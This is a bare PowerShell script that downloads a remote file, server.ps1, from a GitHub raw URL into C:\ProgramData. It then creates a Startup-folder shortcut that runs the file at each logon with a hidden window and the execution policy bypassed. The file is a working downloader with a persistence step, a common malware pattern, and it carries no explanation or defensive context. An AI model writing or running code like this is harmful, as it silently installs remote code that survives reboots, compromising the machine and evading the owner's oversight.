
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/maxobi243/Work/main/server.ps1', 'C:\ProgramData\server.ps1')

$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$target = "powershell.exe"
$argsa = '-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\server.ps1"'
$link = "$startup\TEST.lnk"


$wsh = New-Object -ComObject WScript.Shell
$sc = $wsh.CreateShortcut($link)
$sc.TargetPath = $target
$sc.Arguments = $argsa
$sc.WorkingDirectory = "C:\ProgramData"

$sc.WindowStyle = 7


$sc.Save()




